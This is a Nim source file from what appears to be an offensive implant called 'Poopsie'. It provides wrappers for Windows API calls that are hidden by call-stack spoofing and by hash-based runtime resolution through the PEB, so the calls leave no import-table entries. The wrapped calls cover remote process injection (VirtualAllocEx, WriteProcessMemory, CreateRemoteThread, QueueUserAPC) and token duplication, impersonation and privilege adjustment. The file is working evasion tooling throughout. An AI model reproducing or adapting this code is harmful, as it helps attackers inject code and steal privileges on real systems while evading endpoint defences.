## Dynamic Win32 API resolution wrappers for Poopsie.
##
## Layered evasion architecture (highest priority first):
## 1. evasion_stack_spoof + amd64: Route calls through spoofed stack frames
## 2. evasion_dfr: Resolve Win32 APIs at runtime via PEB walk (no IAT entries)
## 3. Neither: No wrapper — task files use winim originals directly
##
## Task files import this module and exclude the same names from winim:
##   import winim/lean except VirtualAllocEx, WriteProcessMemory, ...
##   import ../utils/winapi

import winim/lean

# --- Resolve helpers used by both stack_spoof and dfr layers ---

when defined(evasion_dfr) or defined(evasion_stack_spoof):
  import evasion

when defined(evasion_dfr):
  proc resolveK32(funcName: string): pointer =
    let modHash = djb2HashStrLower("kernel32.dll")
    let fnHash = djb2HashStr(funcName)
    return resolveFunction(modHash, fnHash)

  proc resolveAdv32(funcName: string): pointer =
    let modHash = djb2HashStrLower("advapi32.dll")
    let fnHash = djb2HashStr(funcName)
    return resolveFunction(modHash, fnHash)

elif defined(evasion_stack_spoof):
  # stack_spoof without DFR: resolve function pointers via GetProcAddress
  proc resolveK32(funcName: string): pointer =
    let h = GetModuleHandleA("kernel32.dll")
    return cast[pointer](GetProcAddress(h, funcName))

  proc resolveAdv32(funcName: string): pointer =
    let h = GetModuleHandleA("advapi32.dll")
    return cast[pointer](GetProcAddress(h, funcName))

# ============================================================
# Stack-spoofed wrapper layer (highest priority)
# All API calls routed through spoofed stack frames.
# Internally resolves via DFR (PEB walk) or GetProcAddress.
# ============================================================

when defined(evasion_stack_spoof) and defined(amd64):

  # ---- kernel32.dll ----

  proc VirtualAllocEx*(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T,
      flAllocationType: DWORD, flProtect: DWORD): LPVOID =
    cast[LPVOID](callWithSpoofedStack5(resolveK32("VirtualAllocEx"),
      cast[uint](hProcess), cast[uint](lpAddress), cast[uint](dwSize),
      cast[uint](flAllocationType), cast[uint](flProtect)))

  proc VirtualProtectEx*(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T,
      flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL =
    cast[WINBOOL](callWithSpoofedStack5(resolveK32("VirtualProtectEx"),
      cast[uint](hProcess), cast[uint](lpAddress), cast[uint](dwSize),
      cast[uint](flNewProtect), cast[uint](lpflOldProtect)))

  proc VirtualAlloc*(lpAddress: LPVOID, dwSize: SIZE_T,
      flAllocationType: DWORD, flProtect: DWORD): LPVOID =
    cast[LPVOID](callWithSpoofedStack(resolveK32("VirtualAlloc"),
      cast[uint](lpAddress), cast[uint](dwSize),
      cast[uint](flAllocationType), cast[uint](flProtect)))

  proc VirtualProtect*(lpAddress: LPVOID, dwSize: SIZE_T,
      flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL =
    cast[WINBOOL](callWithSpoofedStack(resolveK32("VirtualProtect"),
      cast[uint](lpAddress), cast[uint](dwSize),
      cast[uint](flNewProtect), cast[uint](lpflOldProtect)))

  proc VirtualFree*(lpAddress: LPVOID, dwSize: SIZE_T, dwFreeType: DWORD): WINBOOL =
    cast[WINBOOL](callWithSpoofedStack(resolveK32("VirtualFree"),
      cast[uint](lpAddress), cast[uint](dwSize), cast[uint](dwFreeType), 0'u))

  proc WriteProcessMemory*(hProcess: HANDLE, lpBaseAddress: LPVOID,
      lpBuffer: LPCVOID, nSize: SIZE_T, lpNumberOfBytesWritten: ptr SIZE_T): WINBOOL =
    cast[WINBOOL](callWithSpoofedStack5(resolveK32("WriteProcessMemory"),
      cast[uint](hProcess), cast[uint](lpBaseAddress), cast[uint](lpBuffer),
      cast[uint](nSize), cast[uint](lpNumberOfBytesWritten)))

  proc CreateRemoteThread*(hProcess: HANDLE, lpThreadAttributes: LPSECURITY_ATTRIBUTES,
      dwStackSize: SIZE_T, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: LPVOID,
      dwCreationFlags: DWORD, lpThreadId: LPDWORD): HANDLE =
    cast[HANDLE](callWithSpoofedStack7(resolveK32("CreateRemoteThread"),
      cast[uint](hProcess), cast[uint](lpThreadAttributes), cast[uint](dwStackSize),
      cast[uint](lpStartAddress), cast[uint](lpParameter),
      cast[uint](dwCreationFlags), cast[uint](lpThreadId)))

  proc OpenProcess*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL,
      dwProcessId: DWORD): HANDLE =
    cast[HANDLE](callWithSpoofedStack(resolveK32("OpenProcess"),
      cast[uint](dwDesiredAccess), cast[uint](bInheritHandle),
      cast[uint](dwProcessId), 0'u))

  proc CreateProcessA*(lpApplicationName: LPCSTR, lpCommandLine: LPSTR,
      lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES,
      bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID,
      lpCurrentDirectory: LPCSTR, lpStartupInfo: ptr STARTUPINFOA,
      lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL =
    cast[WINBOOL](callWithSpoofedStack10(resolveK32("CreateProcessA"),
      cast[uint](lpApplicationName), cast[uint](lpCommandLine),
      cast[uint](lpProcessAttributes), cast[uint](lpThreadAttributes),
      cast[uint](bInheritHandles), cast[uint](dwCreationFlags),
      cast[uint](lpEnvironment), cast[uint](lpCurrentDirectory),
      cast[uint](lpStartupInfo), cast[uint](lpProcessInformation)))

  proc ResumeThread*(hThread: HANDLE): DWORD =
    cast[DWORD](callWithSpoofedStack(resolveK32("ResumeThread"),
      cast[uint](hThread), 0'u, 0'u, 0'u))

  proc QueueUserAPC*(pfnAPC: PAPCFUNC, hThread: HANDLE, dwData: ULONG_PTR): DWORD =
    cast[DWORD](callWithSpoofedStack(resolveK32("QueueUserAPC"),
      cast[uint](pfnAPC), cast[uint](hThread), cast[uint](dwData), 0'u))

  # ---- advapi32.dll ----

  proc OpenProcessToken*(ProcessHandle: HANDLE, DesiredAccess: DWORD,
      TokenHandle: PHANDLE): WINBOOL =
    cast[WINBOOL](callWithSpoofedStack(resolveAdv32("OpenProcessToken"),
      cast[uint](ProcessHandle), cast[uint](DesiredAccess),
      cast[uint](TokenHandle), 0'u))

  proc DuplicateTokenEx*(hExistingToken: HANDLE, dwDesiredAccess: DWORD,
      lpTokenAttributes: LPSECURITY_ATTRIBUTES, ImpersonationLevel: SECURITY_IMPERSONATION_LEVEL,
      TokenType: TOKEN_TYPE, phNewToken: PHANDLE): WINBOOL =
    cast[WINBOOL](callWithSpoofedStack7(resolveAdv32("DuplicateTokenEx"),
      cast[uint](hExistingToken), cast[uint](dwDesiredAccess),
      cast[uint](lpTokenAttributes), cast[uint](ImpersonationLevel),
      cast[uint](TokenType), cast[uint](phNewToken), 0'u))

  proc ImpersonateLoggedOnUser*(hToken: HANDLE): WINBOOL =
    cast[WINBOOL](callWithSpoofedStack(resolveAdv32("ImpersonateLoggedOnUser"),
      cast[uint](hToken), 0'u, 0'u, 0'u))

  proc AdjustTokenPrivileges*(TokenHandle: HANDLE, DisableAllPrivileges: WINBOOL,
      NewState: PTOKEN_PRIVILEGES, BufferLength: DWORD,
      PreviousState: PTOKEN_PRIVILEGES, ReturnLength: PDWORD): WINBOOL =
    cast[WINBOOL](callWithSpoofedStack7(resolveAdv32("AdjustTokenPrivileges"),
      cast[uint](TokenHandle), cast[uint](DisableAllPrivileges),
      cast[uint](NewState), cast[uint](BufferLength),
      cast[uint](PreviousState), cast[uint](ReturnLength), 0'u))

  proc RevertToSelf*(): WINBOOL =
    cast[WINBOOL](callWithSpoofedStack(resolveAdv32("RevertToSelf"),
      0'u, 0'u, 0'u, 0'u))

  proc CreateProcessWithTokenW*(hToken: HANDLE, dwLogonFlags: DWORD,
      lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR,
      dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCWSTR,
      lpStartupInfo: LPSTARTUPINFOW, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL =
    cast[WINBOOL](callWithSpoofedStack10(resolveAdv32("CreateProcessWithTokenW"),
      cast[uint](hToken), cast[uint](dwLogonFlags),
      cast[uint](lpApplicationName), cast[uint](lpCommandLine),
      cast[uint](dwCreationFlags), cast[uint](lpEnvironment),
      cast[uint](lpCurrentDirectory), cast[uint](lpStartupInfo),
      cast[uint](lpProcessInformation), 0'u))

  proc CreateProcessWithLogonW*(lpUsername: LPCWSTR, lpDomain: LPCWSTR, lpPassword: LPCWSTR,
      dwLogonFlags: DWORD, lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR,
      dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCWSTR,
      lpStartupInfo: LPSTARTUPINFOW, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL =
    # 11 args — exceeds stack spoof arity, use direct resolved call
    type T = proc(a: LPCWSTR, b: LPCWSTR, c: LPCWSTR, d: DWORD,
      e: LPCWSTR, f: LPWSTR, g: DWORD, h: LPVOID, i: LPCWSTR,
      j: LPSTARTUPINFOW, k: LPPROCESS_INFORMATION): WINBOOL {.stdcall.}
    cast[T](resolveAdv32("CreateProcessWithLogonW"))(lpUsername, lpDomain, lpPassword,
      dwLogonFlags, lpApplicationName, lpCommandLine, dwCreationFlags,
      lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation)

# ============================================================
# DFR-only layer (when stack_spoof is NOT enabled)
# Resolve Win32 APIs at runtime via PEB walk — no IAT entries
# ============================================================

elif defined(evasion_dfr):

  # ---- kernel32.dll ----

  type
    TVirtualAllocEx {.used.} = proc(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T,
      flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall.}
    TVirtualProtectEx {.used.} = proc(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T,
      flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL {.stdcall.}
    TVirtualAlloc {.used.} = proc(lpAddress: LPVOID, dwSize: SIZE_T,
      flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall.}
    TVirtualProtect {.used.} = proc(lpAddress: LPVOID, dwSize: SIZE_T,
      flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL {.stdcall.}
    TVirtualFree {.used.} = proc(lpAddress: LPVOID, dwSize: SIZE_T, dwFreeType: DWORD): WINBOOL {.stdcall.}
    TWriteProcessMemory {.used.} = proc(hProcess: HANDLE, lpBaseAddress: LPVOID,
      lpBuffer: LPCVOID, nSize: SIZE_T, lpNumberOfBytesWritten: ptr SIZE_T): WINBOOL {.stdcall.}
    TCreateRemoteThread {.used.} = proc(hProcess: HANDLE, lpThreadAttributes: LPSECURITY_ATTRIBUTES,
      dwStackSize: SIZE_T, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: LPVOID,
      dwCreationFlags: DWORD, lpThreadId: LPDWORD): HANDLE {.stdcall.}
    TOpenProcess {.used.} = proc(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL,
      dwProcessId: DWORD): HANDLE {.stdcall.}
    TCreateProcessA {.used.} = proc(lpApplicationName: LPCSTR, lpCommandLine: LPSTR,
      lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES,
      bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID,
      lpCurrentDirectory: LPCSTR, lpStartupInfo: ptr STARTUPINFOA,
      lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.stdcall.}
    TResumeThread {.used.} = proc(hThread: HANDLE): DWORD {.stdcall.}
    TQueueUserAPC {.used.} = proc(pfnAPC: PAPCFUNC, hThread: HANDLE, dwData: ULONG_PTR): DWORD {.stdcall.}
    TOpenProcessToken {.used.} = proc(ProcessHandle: HANDLE, DesiredAccess: DWORD,
      TokenHandle: PHANDLE): WINBOOL {.stdcall.}
    TDuplicateTokenEx {.used.} = proc(hExistingToken: HANDLE, dwDesiredAccess: DWORD,
      lpTokenAttributes: LPSECURITY_ATTRIBUTES, ImpersonationLevel: SECURITY_IMPERSONATION_LEVEL,
      TokenType: TOKEN_TYPE, phNewToken: PHANDLE): WINBOOL {.stdcall.}
    TImpersonateLoggedOnUser {.used.} = proc(hToken: HANDLE): WINBOOL {.stdcall.}
    TAdjustTokenPrivileges {.used.} = proc(TokenHandle: HANDLE, DisableAllPrivileges: WINBOOL,
      NewState: PTOKEN_PRIVILEGES, BufferLength: DWORD,
      PreviousState: PTOKEN_PRIVILEGES, ReturnLength: PDWORD): WINBOOL {.stdcall.}
    TRevertToSelf {.used.} = proc(): WINBOOL {.stdcall.}
    TCreateProcessWithTokenW {.used.} = proc(hToken: HANDLE, dwLogonFlags: DWORD,
      lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR,
      dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCWSTR,
      lpStartupInfo: LPSTARTUPINFOW, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.stdcall.}
    TCreateProcessWithLogonW {.used.} = proc(lpUsername: LPCWSTR, lpDomain: LPCWSTR, lpPassword: LPCWSTR,
      dwLogonFlags: DWORD, lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR,
      dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCWSTR,
      lpStartupInfo: LPSTARTUPINFOW, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.stdcall.}

  proc VirtualAllocEx*(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T,
      flAllocationType: DWORD, flProtect: DWORD): LPVOID =
    cast[TVirtualAllocEx](resolveK32("VirtualAllocEx"))(hProcess, lpAddress, dwSize, flAllocationType, flProtect)

  proc VirtualProtectEx*(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T,
      flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL =
    cast[TVirtualProtectEx](resolveK32("VirtualProtectEx"))(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect)

  proc VirtualAlloc*(lpAddress: LPVOID, dwSize: SIZE_T,
      flAllocationType: DWORD, flProtect: DWORD): LPVOID =
    cast[TVirtualAlloc](resolveK32("VirtualAlloc"))(lpAddress, dwSize, flAllocationType, flProtect)

  proc VirtualProtect*(lpAddress: LPVOID, dwSize: SIZE_T,
      flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL =
    cast[TVirtualProtect](resolveK32("VirtualProtect"))(lpAddress, dwSize, flNewProtect, lpflOldProtect)

  proc VirtualFree*(lpAddress: LPVOID, dwSize: SIZE_T, dwFreeType: DWORD): WINBOOL =
    cast[TVirtualFree](resolveK32("VirtualFree"))(lpAddress, dwSize, dwFreeType)

  proc WriteProcessMemory*(hProcess: HANDLE, lpBaseAddress: LPVOID,
      lpBuffer: LPCVOID, nSize: SIZE_T, lpNumberOfBytesWritten: ptr SIZE_T): WINBOOL =
    cast[TWriteProcessMemory](resolveK32("WriteProcessMemory"))(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten)

  proc CreateRemoteThread*(hProcess: HANDLE, lpThreadAttributes: LPSECURITY_ATTRIBUTES,
      dwStackSize: SIZE_T, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: LPVOID,
      dwCreationFlags: DWORD, lpThreadId: LPDWORD): HANDLE =
    cast[TCreateRemoteThread](resolveK32("CreateRemoteThread"))(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId)

  proc OpenProcess*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL,
      dwProcessId: DWORD): HANDLE =
    cast[TOpenProcess](resolveK32("OpenProcess"))(dwDesiredAccess, bInheritHandle, dwProcessId)

  proc CreateProcessA*(lpApplicationName: LPCSTR, lpCommandLine: LPSTR,
      lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES,
      bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID,
      lpCurrentDirectory: LPCSTR, lpStartupInfo: ptr STARTUPINFOA,
      lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL =
    cast[TCreateProcessA](resolveK32("CreateProcessA"))(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
      bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation)

  proc ResumeThread*(hThread: HANDLE): DWORD =
    cast[TResumeThread](resolveK32("ResumeThread"))(hThread)

  proc QueueUserAPC*(pfnAPC: PAPCFUNC, hThread: HANDLE, dwData: ULONG_PTR): DWORD =
    cast[TQueueUserAPC](resolveK32("QueueUserAPC"))(pfnAPC, hThread, dwData)

  # ---- advapi32.dll ----

  proc OpenProcessToken*(ProcessHandle: HANDLE, DesiredAccess: DWORD,
      TokenHandle: PHANDLE): WINBOOL =
    cast[TOpenProcessToken](resolveAdv32("OpenProcessToken"))(ProcessHandle, DesiredAccess, TokenHandle)

  proc DuplicateTokenEx*(hExistingToken: HANDLE, dwDesiredAccess: DWORD,
      lpTokenAttributes: LPSECURITY_ATTRIBUTES, ImpersonationLevel: SECURITY_IMPERSONATION_LEVEL,
      TokenType: TOKEN_TYPE, phNewToken: PHANDLE): WINBOOL =
    cast[TDuplicateTokenEx](resolveAdv32("DuplicateTokenEx"))(hExistingToken, dwDesiredAccess, lpTokenAttributes, ImpersonationLevel, TokenType, phNewToken)

  proc ImpersonateLoggedOnUser*(hToken: HANDLE): WINBOOL =
    cast[TImpersonateLoggedOnUser](resolveAdv32("ImpersonateLoggedOnUser"))(hToken)

  proc AdjustTokenPrivileges*(TokenHandle: HANDLE, DisableAllPrivileges: WINBOOL,
      NewState: PTOKEN_PRIVILEGES, BufferLength: DWORD,
      PreviousState: PTOKEN_PRIVILEGES, ReturnLength: PDWORD): WINBOOL =
    cast[TAdjustTokenPrivileges](resolveAdv32("AdjustTokenPrivileges"))(TokenHandle, DisableAllPrivileges, NewState, BufferLength, PreviousState, ReturnLength)

  proc RevertToSelf*(): WINBOOL =
    cast[TRevertToSelf](resolveAdv32("RevertToSelf"))()

  proc CreateProcessWithTokenW*(hToken: HANDLE, dwLogonFlags: DWORD,
      lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR,
      dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCWSTR,
      lpStartupInfo: LPSTARTUPINFOW, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL =
    cast[TCreateProcessWithTokenW](resolveAdv32("CreateProcessWithTokenW"))(hToken, dwLogonFlags, lpApplicationName, lpCommandLine, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation)

  proc CreateProcessWithLogonW*(lpUsername: LPCWSTR, lpDomain: LPCWSTR, lpPassword: LPCWSTR,
      dwLogonFlags: DWORD, lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR,
      dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCWSTR,
      lpStartupInfo: LPSTARTUPINFOW, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL =
    cast[TCreateProcessWithLogonW](resolveAdv32("CreateProcessWithLogonW"))(lpUsername, lpDomain, lpPassword, dwLogonFlags, lpApplicationName, lpCommandLine, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation)
